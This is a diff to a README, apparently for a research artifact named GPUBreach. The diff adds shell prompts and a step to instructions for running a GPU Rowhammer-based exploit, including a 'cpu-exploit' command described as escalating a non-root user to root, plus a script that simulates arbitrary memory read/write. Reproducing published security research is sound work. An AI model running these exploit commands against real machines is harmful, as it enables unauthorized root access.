@@ -274,8 +274,8 @@ $ make -j
 
 First execute the GPUBreach program designed for CPU-side exploit:
 ```bash
-cd gpubreach
-python3 gpubreach.py app_cpu_exploit --n_step1 24109 --n_step3 24070 -t 0.2 -s 15
+$ cd gpubreach
+$ python3 gpubreach.py app_cpu_exploit --n_step1 24109 --n_step3 24070 -t 0.2 -s 15
 ```
 
 When corruption is successful, the program will pause and you will see the following text:
@@ -358,14 +358,15 @@ Given the scenario where we power cycle the machine (i.e. [Debugging Tips](#debu
 
 First, run:
 ```bash
+$ cd d2h-tools
 $ ./cpu-exploit/cpu-exploit ./d_pattern.bin  # Run this command as-is as a regular user with GPU access (non-root). The exploit will later escalate privileges to root.
 ```
 
-Instead of using GPUBreach, we simulate the arbitrary RW with the `simulate_rowhammer.sh` script. Modify the `IOVA_BASE` in `simulate_rowhammer.sh` to `0xfff00000` or `0xffe00000`
+Instead of using GPUBreach, open another terminal and we will simulate the arbitrary RW with the `simulate_rowhammer.sh` script. Modify the `IOVA_BASE` in `simulate_rowhammer.sh` to `0xfff00000` or `0xffe00000`.
 
 ```bash
-cd d2h-tools/gpu_mem_dumper/scripts/
-sudo bash ./simulate_rowhammer.sh
+$ cd d2h-tools/gpu_mem_dumper/scripts/
+$ sudo bash ./simulate_rowhammer.sh
 ``` 
 
 Now you can go back to step 4.
